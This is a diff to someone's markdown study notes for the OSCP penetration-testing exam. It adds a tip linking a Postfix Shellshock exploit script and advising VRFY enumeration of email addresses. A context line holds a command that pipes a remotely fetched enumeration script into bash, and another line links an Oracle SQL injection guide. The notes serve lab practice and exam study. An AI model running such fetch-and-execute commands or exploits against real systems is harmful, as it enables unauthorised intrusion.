@@ -20,6 +20,7 @@ description: Just some rough notes in preparation for the OSCP.
   * `curl 10.10.10.1:8080/linpeas.sh | bash`
 * **REMEMBER KISS - Keep It Super Simple**. Several times I have tried to do something overly complicated when the first thing I would have tried would work.
 * Oracle SQLi - [This link](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) is beyond useful. Got me out of a situation where I was extremely stuck.&#x20;
+* If testing for Shellshock on SMTP then I have found[ this exploit ](https://github.com/3mrgnc3/pentest\_old/blob/master/postfix-shellshock-nc.py)to be the most reliable. It requires a valid email address so ensure you run `VRFY` to enumerate a valid email prior to execution.
 
 ### Helpful Blogs
 
